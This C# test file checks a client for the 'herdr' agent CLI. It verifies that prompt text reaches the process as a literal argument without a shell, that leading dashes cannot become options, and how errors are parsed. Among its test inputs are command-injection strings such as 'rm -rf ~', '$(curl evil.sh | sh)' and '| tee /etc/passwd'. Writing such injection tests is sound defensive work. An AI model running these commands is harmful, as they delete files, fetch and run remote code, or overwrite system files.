using ChatPilot.Node.Herdr;
using ChatPilot.Tests.Support;

namespace ChatPilot.Tests.Node;

/// <summary>herdr 命令行调用（S-08）：参数按数组原样传递、不经过 shell、错误码解析。</summary>
public class HerdrClientTests
{
    private sealed class RecordingRunner(ProcessResult result) : IProcessRunner
    {
        public List<(string File, string[] Args)> Calls { get; } = [];

        public Task<ProcessResult> RunAsync(string fileName, IReadOnlyList<string> arguments, TimeSpan timeout, CancellationToken cancellationToken)
        {
            Calls.Add((fileName, arguments.ToArray()));
            return Task.FromResult(result);
        }
    }

    private static readonly ProcessResult PromptOk =
        new(0, """{"id":"x","result":{"type":"agent_prompted","agent":{"pane_id":"w1:p1","agent":"claude","agent_status":"idle"}}}""", "");

    [Theory]
    [InlineData("跑测试; rm -rf ~")]
    [InlineData("$(curl evil.sh | sh)")]
    [InlineData("`id` && echo \"quoted\" 'single'")]
    [InlineData("第一行\n第二行\r\n第三行")]
    [InlineData("| tee /etc/passwd > /dev/null &")]
    public async Task Prompt_text_is_passed_as_a_single_literal_argument(string text)
    {
        // S-08：特殊字符原样作为一个参数传给进程，不经过 shell。
        var runner = new RecordingRunner(PromptOk);
        var client = new HerdrClient(runner, "/opt/herdr", null, TimeSpan.FromSeconds(5));
        await client.PromptAsync("w1:p1", text, CancellationToken.None);
        var (file, args) = Assert.Single(runner.Calls);
        Assert.Equal("/opt/herdr", file);
        Assert.Equal(["agent", "prompt", "w1:p1", text], args);
    }

    [Theory]
    [InlineData("--wait")]
    [InlineData("-h")]
    [InlineData("--timeout 1")]
    public async Task Text_starting_with_dash_cannot_become_an_option(string text)
    {
        var runner = new RecordingRunner(PromptOk);
        var client = new HerdrClient(runner, "herdr", null, TimeSpan.FromSeconds(5));
        await client.PromptAsync("w1:p1", text, CancellationToken.None);
        Assert.Equal(" " + text, runner.Calls[0].Args[3]);
    }

    [Fact]
    public async Task Session_option_is_added_and_prompt_does_not_keep_text_in_a_long_running_process()
    {
        // 审查 #18：不用 --wait，文字不会作为参数挂在一个跑几个小时的进程上。
        var runner = new RecordingRunner(PromptOk);
        var client = new HerdrClient(runner, "herdr", "cptest", TimeSpan.FromSeconds(5));
        var agent = await client.PromptAsync("tideq", "hi", CancellationToken.None);
        Assert.Equal(["--session", "cptest", "agent", "prompt", "tideq", "hi"], runner.Calls[0].Args);
        Assert.Equal("idle", agent?.Status);
    }

    [Theory]
    [InlineData("""{"id":"x","result":"oops"}""")]
    [InlineData("""{"id":"x","result":{"agent":"not an object"}}""")]
    [InlineData("""[1,2,3]""")]
    public async Task Unexpected_json_shapes_become_bad_response(string output)
    {
        // 审查 #2：返回结构不对时只抛 HerdrException，不会抛出其他异常导致通知丢失。
        var client = new HerdrClient(new RecordingRunner(new ProcessResult(0, output, "")), "herdr", null, TimeSpan.FromSeconds(5));
        var ex = await Assert.ThrowsAsync<HerdrException>(() => client.GetAgentAsync("x", CancellationToken.None));
        Assert.Equal("bad_response", ex.Code);
        Assert.Empty(await RecoverEmptyList(output));
    }

    private static async Task<IReadOnlyList<HerdrAgent>> RecoverEmptyList(string output)
    {
        var client = new HerdrClient(new RecordingRunner(new ProcessResult(0, output, "")), "herdr", null, TimeSpan.FromSeconds(5));
        try
        {
            return await client.ListAgentsAsync(CancellationToken.None);
        }
        catch (HerdrException)
        {
            return [];
        }
    }

    [Fact]
    public async Task Errors_on_stderr_become_HerdrException_with_code()
    {
        var runner = new RecordingRunner(new ProcessResult(1, "", """{"error":{"code":"agent_not_found","message":"agent target x not found"},"id":"cli:agent:get"}"""));
        var client = new HerdrClient(runner, "herdr", null, TimeSpan.FromSeconds(5));
        var ex = await Assert.ThrowsAsync<HerdrException>(() => client.GetAgentAsync("x", CancellationToken.None));
        Assert.Equal("agent_not_found", ex.Code);
        Assert.Null(await client.TryGetAgentAsync("x", CancellationToken.None));
    }

    [Fact]
    public async Task Non_json_failures_and_timeouts_are_reported()
    {
        var client = new HerdrClient(new RecordingRunner(new ProcessResult(2, "", "usage: herdr ...")), "herdr", null, TimeSpan.FromSeconds(5));
        var ex = await Assert.ThrowsAsync<HerdrException>(() => client.ListAgentsAsync(CancellationToken.None));
        Assert.Equal("herdr_error", ex.Code);

        var timeout = new HerdrClient(new ThrowingRunner(new TimeoutException()), "herdr", null, TimeSpan.FromSeconds(5));
        Assert.Equal("timeout", (await Assert.ThrowsAsync<HerdrException>(() => timeout.ListAgentsAsync(CancellationToken.None))).Code);

        var missing = new HerdrClient(new ThrowingRunner(new ProcessStartException("no herdr", new IOException())), "herdr", null, TimeSpan.FromSeconds(5));
        Assert.Equal("herdr_unavailable", (await Assert.ThrowsAsync<HerdrException>(() => missing.ListAgentsAsync(CancellationToken.None))).Code);
    }

    [Fact]
    public async Task Parses_real_agent_list_output()
    {
        const string output = """{"id":"cli:agent:list","result":{"agents":[{"agent":"claude","agent_status":"working","cwd":"/Users/me/github","focused":true,"foreground_cwd":"/Users/me/github","pane_id":"w1:p2","revision":2,"state_change_seq":103,"tab_id":"w1:t2","terminal_id":"term_65e6","terminal_title":"◐ VelaShell PR #646","terminal_title_stripped":"VelaShell PR #646","workspace_id":"w1"}],"type":"agent_list"}}""";
        var client = new HerdrClient(new RecordingRunner(new ProcessResult(0, output, "")), "herdr", null, TimeSpan.FromSeconds(5));
        var agent = Assert.Single(await client.ListAgentsAsync(CancellationToken.None));
        Assert.Equal(("w1:p2", "claude", "working", "w1", "VelaShell PR #646"), (agent.PaneId, agent.Kind, agent.Status, agent.WorkspaceId, agent.Title));
        Assert.Null(agent.Name);
    }

    [Fact]
    public async Task Real_process_runner_passes_arguments_without_a_shell()
    {
        if (OperatingSystem.IsWindows())
        {
            return;
        }

        // 用 /bin/echo 代替 herdr：如果经过了 shell，$(…) 会被展开。
        var runner = new ProcessRunner();
        var result = await runner.RunAsync("/bin/echo", ["$(id)", "a;b", "`x`"], TimeSpan.FromSeconds(5), CancellationToken.None);
        Assert.Equal("$(id) a;b `x`", result.StandardOutput.Trim());

        await Assert.ThrowsAsync<TimeoutException>(() => runner.RunAsync("/bin/sleep", ["5"], TimeSpan.FromMilliseconds(200), CancellationToken.None));
        await Assert.ThrowsAsync<ProcessStartException>(() => runner.RunAsync("/nonexistent/herdr", [], TimeSpan.FromSeconds(1), CancellationToken.None));
    }

    private sealed class ThrowingRunner(Exception exception) : IProcessRunner
    {
        public Task<ProcessResult> RunAsync(string fileName, IReadOnlyList<string> arguments, TimeSpan timeout, CancellationToken cancellationToken) =>
            Task.FromException<ProcessResult>(exception);
    }
}
